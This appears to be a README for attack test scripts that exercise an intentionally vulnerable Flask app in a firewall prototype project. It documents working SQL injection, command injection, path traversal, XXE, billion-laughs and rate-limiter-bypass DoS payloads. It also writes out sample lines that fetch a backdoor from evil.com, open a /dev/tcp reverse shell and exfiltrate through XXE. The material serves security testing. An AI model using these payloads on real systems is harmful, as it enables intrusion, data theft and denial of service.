# Automated Attack Test Scripts

## Overview

This directory contains automated test scripts that validate the 7 intentional vulnerabilities in the VM2 Flask web application. Each script sends crafted payloads against specific endpoints and reports whether the attack succeeded.

### Scripts Summary

| Script | Vulnerability | Target Endpoint | Payloads | Status |
|--------|---------------|-----------------|----------|--------|
| `test_sqli.py` | SQL Injection | `POST /login` | 7 | Working |
| `test_cmdi.py` | Command Injection | `POST /cmd` | 7 | Working |
| `test_lfi.py` | Path Traversal | `POST /file` | 7 | Working |
| `test_xxe.py` | XXE Injection | `POST /api/xml` | 7 | Working |
| `test_dos.py` | Denial of Service | Multiple | 7 vectors | Working |

---

## Prerequisites

### Environment
- VM2 Flask app running on `http://localhost:5000`
- Python 3.8+ with virtual environment activated
- `requests` library installed: `pip install requests`

### Starting the Target Application
```bash
cd /home/ubuntuhero/ngfw-prototype/web
source /home/ubuntuhero/ngfw/bin/activate
python3 app.py
```

### Running All Tests
```bash
cd /home/ubuntuhero/ngfw-prototype/web
source /home/ubuntuhero/ngfw/bin/activate

python3 tests/test_sqli.py
python3 tests/test_cmdi.py
python3 tests/test_lfi.py
python3 tests/test_xxe.py
python3 tests/test_dos.py
```

---

## Common Architecture

All scripts follow the same structural pattern:

```
1. Define BASE_URL and configuration constants
2. Define PAYLOADS list (7 items each)
3. test_payload() function - sends one payload, returns result dict
4. print_report() function - formats and prints results with color coding
5. Main block - iterates payloads, collects results, prints report
```

### Shared Design Elements

| Element | Value |
|---------|-------|
| Base URL | `http://localhost:5000` |
| Delay between payloads | 1.5 seconds (injection scripts) |
| Request timeout | 15-30 seconds |
| Exit code 0 | At least one payload succeeded |
| Exit code 1 | All payloads failed |
| Color scheme | Green=PASS, Red=FAIL, Yellow=WARNING, Blue=INFO |

---

## 1. SQL Injection Test (`test_sqli.py`)

### What It Tests
Authentication bypass via SQL injection on the login endpoint. The application constructs SQL queries using string interpolation instead of parameterized queries.

### Target Endpoint
```
POST /login
Content-Type: application/x-www-form-urlencoded
Body: username=<payload>&password=<any>
```

### How the Vulnerability Works
The vulnerable code in `src/routes/auth_routes.py` builds the query like this:
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```
An attacker injects SQL logic through the `username` field to make the WHERE clause always true.

### Payloads

| # | Username Payload | Password | Technique | How It Works |
|---|-----------------|----------|-----------|--------------|
| 1 | `admin' OR '1'='1'--` | `anything` | OR bypass | Closes string, adds OR true condition, comments out rest |
| 2 | `' OR '1'='1'--` | `anything` | Empty user OR | Same as #1 but without a username prefix |
| 3 | `admin'--` | (empty) | Comment bypass | Closes string, comments out password check entirely |
| 4 | `admin' AND '1'='1'--` | `anything` | AND condition | Adds always-true AND clause after valid username |
| 5 | `' OR 'x'='x'--` | `anything` | String OR | Uses string comparison instead of numeric |
| 6 | `1' OR 1=1 LIMIT 1--` | `anything` | LIMIT constraint | Forces query to return exactly one row |
| 7 | `admin' UNION SELECT 1,'union','pass','union@union.com','2024-01-01'--` | `anything` | UNION injection | Appends a fake user row via UNION SELECT (5 columns) |

### Success Criteria
- **Pass**: HTTP 302 redirect to `/` (indicates successful login)
- **Fail**: HTTP 200 with error message (login rejected)

### Resulting SQL Queries

Payload #1 produces:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'--' AND password = 'anything'
```
The `'1'='1'` is always true, and `--` comments out the rest.

Payload #7 produces:
```sql
SELECT * FROM users WHERE username = 'admin' UNION SELECT 1,'union','pass','union@union.com','2024-01-01'--' AND password = 'anything'
```
This returns both the admin row AND a fake injected row.

### Example Output
```
======================================================================
SQL Injection Test Results - POST /login
======================================================================

  [PASS] Payload #1: OR bypass - classic auth bypass
    Username: admin' OR '1'='1'--
    Response: HTTP 302 - HTTP 302 → /

  ...

Summary: 7/7 payloads passed
All SQL injection payloads successfully bypassed authentication.
======================================================================
```

---

## 2. Command Injection Test (`test_cmdi.py`)

### What It Tests
Arbitrary command execution via the command endpoint. The application passes user input directly to the system shell.

### Target Endpoint
```
POST /cmd
Content-Type: application/json
Body: {"command": "<any_shell_command>"}
```

### How the Vulnerability Works
The vulnerable code in `src/routes/command_routes.py` executes:
```python
command = f"ping -c 4 {host}"
result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
```
Using `shell=True` means any shell metacharacters (`;`, `|`, `&&`, `$()`) will be interpreted by the shell.

### Payloads

| # | Command | Expected Output | Technique | What It Demonstrates |
|---|---------|----------------|-----------|---------------------|
| 1 | `whoami` | `ubuntuhero` | Direct command | Basic command execution |
| 2 | `id` | `uid=` | Identity check | Shows full user context (UID, GID, groups) |
| 3 | `cat /etc/hostname` | (any content) | File read | Reading system configuration files |
| 4 | `uname -a` | `Linux` | System info | Kernel version, architecture, hostname |
| 5 | `echo $(date)` | (any content) | Command substitution | Using `$()` to nest commands |
| 6 | `ps aux | head -5` | `PID` | Pipe chaining | Using `|` to chain commands |
| 7 | `ls -la /etc/ | grep passwd` | `passwd` | Grep filter | Combining listing with text search |

### Success Criteria
- **Pass**: JSON response with `"status": "success"` and expected output found in response
- **Fail**: Error response or expected output not found

### Response Format
```json
{
  "status": "success",
  "command": "whoami",
  "output": "ubuntuhero\n",
  "return_code": 0
}
```

### Security Impact
An attacker can:
- Read any file: `cat /etc/shadow`
- Download tools: `wget http://evil.com/backdoor.sh`
- Create reverse shells: `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`
- Pivot to other systems: `ssh key-exfil@10.0.0.2`

---

## 3. Path Traversal Test (`test_lfi.py`)

### What It Tests
Arbitrary file reading via unsanitized file path input. The application reads any file specified by the user without validation.

### Target Endpoint
```
POST /file
Content-Type: application/x-www-form-urlencoded
Body: filename=<file_path>
```

### How the Vulnerability Works
The vulnerable code in `src/routes/file_routes.py`:
```python
with open(filename, 'r') as f:
    content = f.read()
```
No path validation, no allowlist, no `os.path.abspath()` check. Any readable file on the filesystem can be accessed.

### Payloads

| # | File Path | Expected Content | Target Information |
|---|-----------|-----------------|-------------------|
| 1 | `/etc/passwd` | `root:x:0:0` | User accounts, home directories, shells |
| 2 | `/etc/hosts` | `127.0.0.1` | Host mappings, internal IPs |
| 3 | `/etc/group` | `root:x:0` | Group memberships |
| 4 | `/proc/version` | `Linux` | Kernel version and build info |
| 5 | `/etc/lsb-release` | `Ubuntu` | OS distribution and version |
| 6 | `/proc/self/status` | `Name:` | Current process memory, threads, PID |
| 7 | `/etc/resolv.conf` | `nameserver` | DNS server configuration |

### Success Criteria
- **Pass**: JSON response with `"status": "success"` and expected content string found in file content
- **Fail**: Error response or expected content not found

### Response Format
```json
{
  "status": "success",
  "filename": "/etc/passwd",
  "content": "root:x:0:0:root:/root:/bin/bash\n...",
  "size": 1940
}
```

### Advanced Attack Scenarios
- Read application source code: `/home/ubuntuhero/ngfw-prototype/web/src/routes/auth_routes.py`
- Read environment variables: `/proc/self/environ`
- Read SSH keys: `/home/ubuntuhero/.ssh/id_rsa`
- Read database files: `/home/ubuntuhero/ngfw-prototype/web/instance/database.db`

---

## 4. XXE Injection Test (`test_xxe.py`)

### What It Tests
XML External Entity injection for file disclosure. The XML parser is configured to resolve external entities, allowing attackers to read local files through XML.

### Target Endpoint
```
POST /api/xml
Content-Type: text/xml
Body: <XML with DOCTYPE and ENTITY declaration>
```

### How the Vulnerability Works
The vulnerable code in `src/routes/xml_routes.py`:
```python
parser = etree.XMLParser(
    resolve_entities=True,   # Allows external entity resolution
    no_network=False,        # Allows network access
    dtd_validation=False
)
```
The attacker defines a custom XML entity that references a local file, then uses that entity in the document body. The parser resolves the entity, reading the file content into the parsed output.

### XML Payload Structure
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ELEMENT data ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

The `<!ENTITY xxe SYSTEM "file:///etc/passwd">` declares an entity named `xxe` whose value is the contents of `/etc/passwd`. When `&xxe;` appears in the document, the parser replaces it with the file contents.

### Payloads

| # | Entity Path | Expected Content | Target File |
|---|-------------|-----------------|-------------|
| 1 | `file:///etc/passwd` | `root:x:0:0` | User accounts |
| 2 | `file:///etc/hosts` | `127.0.0.1` | Host mappings |
| 3 | `file:///etc/group` | `root:x:0` | Group information |
| 4 | `file:///proc/version` | `Linux` | Kernel version |
| 5 | `file:///etc/lsb-release` | `Ubuntu` | OS release info |
| 6 | `file:///etc/resolv.conf` | `nameserver` | DNS config |
| 7 | `file:///proc/self/status` | `Name:` | Process status |

### Success Criteria
- **Pass**: JSON response with `"status": "success"` and expected content found in parsed XML data
- **Fail**: Error response or expected content not found

### Response Format
```json
{
  "status": "success",
  "data": {
    "data": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon..."
  },
  "root_tag": "data"
}
```

### Advanced XXE Attacks
- **SSRF**: `<!ENTITY xxe SYSTEM "http://10.0.0.1:8080/admin">` to probe internal services
- **Billion Laughs**: Exponential entity expansion causing CPU/memory exhaustion
- **Out-of-band exfiltration**: `<!ENTITY xxe SYSTEM "http://evil.com/?data=...">` to send file contents to attacker

---

## 5. Denial of Service Test (`test_dos.py`)

### What It Tests
Seven different DoS attack vectors targeting resource exhaustion and rate limiter bypass across multiple endpoints.

### Architecture
This script is fundamentally different from the others:
- Uses **concurrent threads** (batches of 10) instead of sequential requests
- **Bypasses rate limiter** by creating a fresh session for each request
- **Measures baseline** response time before flooding
- **50 requests per vector** sent in concurrent batches

### How Rate Limiter Bypass Works
The rate limiter tracks requests per session ID. Each request in the flood creates a new `requests.Session()`, makes an initial GET to `/` to establish a fresh session cookie, then sends the attack request. This gives each request a unique session identifier, effectively bypassing the per-user rate limit of 100 requests/minute.

### Attack Vectors

| # | Name | Target | Method | What It Exhausts |
|---|------|--------|--------|-----------------|
| 1 | HTTP Flood | `GET /` | Concurrent GET | Server connection handling, DB COUNT queries on homepage |
| 2 | Auth Flood | `POST /login` | Concurrent POST with large SQLi payload | Database query processing + request logging (every request writes to DB) |
| 3 | Command Exhaustion | `POST /cmd` | Concurrent `sleep 10` commands | Worker thread starvation (each request blocks for 10 seconds) |
| 4 | Upload Flood | `POST /upload` | Concurrent file uploads (10KB each) | SHA256 hashing + ClamAV scanning per file |
| 5 | XML Billion Laughs | `POST /api/xml` | Concurrent XML entity expansion | CPU and memory via exponential entity growth |
| 6 | Feedback Flood | `POST /feedback` | Concurrent large message submissions | Database INSERT operations + request logging |
| 7 | I/O Exhaustion | `POST /file` | Concurrent reads of `/dev/urandom` | I/O subsystem (infinite random data stream) |

### XML Billion Laughs Payload
```xml
<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY a "0123456789">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
  <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
  <!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
]>
<data>&f;</data>
```
Entity `a` = 10 characters, `b` = 100, `c` = 1,000, `d` = 10,000, `e` = 100,000, `f` = 1,000,000 characters. Each request attempts to expand 1 million characters in memory.

### Execution Flow
```
For each of 7 attack vectors:
  1. Measure baseline (1 request, record response time)
  2. Send 50 requests in batches of 10 concurrent threads
  3. Track: successes, timeouts, 429 errors, 503 errors, failures
  4. Calculate average response time during flood
  5. Compare vs baseline
```

### Pass Criteria
A vector **passes** if ANY of these occur during the 50-request burst:
- Average response time > 3x baseline
- Any request times out (5 second limit)
- Any 429 (Too Many Requests) or 503 (Service Unavailable) errors
- Any connection failures

### Severity Classification
| Passed Vectors | Assessment |
|---------------|------------|
| 5-7 | Significant DoS surface area |
| 3-4 | Moderate DoS surface area |
| 0-2 | Limited DoS impact |

### Configuration Constants
| Constant | Value | Purpose |
|----------|-------|---------|
| `BURST_COUNT` | 50 | Requests per attack vector |
| `REQUEST_TIMEOUT` | 5 | Seconds per request |
| `batch_size` | 10 | Concurrent threads per batch |

---

## Interpreting Results

### Understanding the Output

```
[PASS] Payload #1: Description
```
The payload successfully triggered the vulnerability.

```
[FAIL] Payload #1: Description
```
The payload did not work. This could mean:
- The vulnerability was patched
- The server is not running
- The payload syntax is incorrect
- Network connectivity issues

### Exit Codes
- **Exit 0**: At least one payload succeeded (vulnerability confirmed)
- **Exit 1**: All payloads failed (vulnerability may be patched, or server unavailable)

### Troubleshooting

| Problem | Solution |
|---------|----------|
| Connection refused | Start the Flask app: `python3 app.py` |
| All tests fail | Check `BASE_URL` matches your server address |
| Timeout errors | Increase `REQUEST_TIMEOUT` value in the script |
| Module not found | Activate venv: `source /home/ubuntuhero/ngfw/bin/activate` |
| `requests` not installed | `pip install requests` |

---

## Adding New Test Scripts

To create a new test script, follow this template:

```python
#!/usr/bin/env python3
"""
[Vulnerability] Test Script
Tests 7 payloads against [METHOD] /endpoint
Target: [Description]
"""

import requests
import sys
import time

BASE_URL = "http://localhost:5000"
DELAY = 1.5

PAYLOADS = [
    {"id": 1, "field": "value", "description": "...", "expected_check": "..."},
    # ... 6 more payloads
]

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
RESET = "\033[0m"

def test_payload(payload):
    """Test a single payload"""
    try:
        response = requests.post(
            f"{BASE_URL}/endpoint",
            data={"field": payload["field"]},
            timeout=30,
        )
        # Check result and return dict
    except requests.exceptions.RequestException as e:
        return {"id": payload["id"], "passed": False, "detail": str(e)}

def print_report(results):
    """Print formatted results"""
    # Format and print

if __name__ == "__main__":
    results = []
    for p in PAYLOADS:
        r = test_payload(p)
        results.append(r)
        time.sleep(DELAY)
    print_report(results)
    sys.exit(0 if any(r["passed"] for r in results) else 1)
```

---

*Document generated for Adaptive NGFW Prototype testing purposes.*
*WARNING: These scripts exploit intentionally vulnerable code. Never run against production systems.*
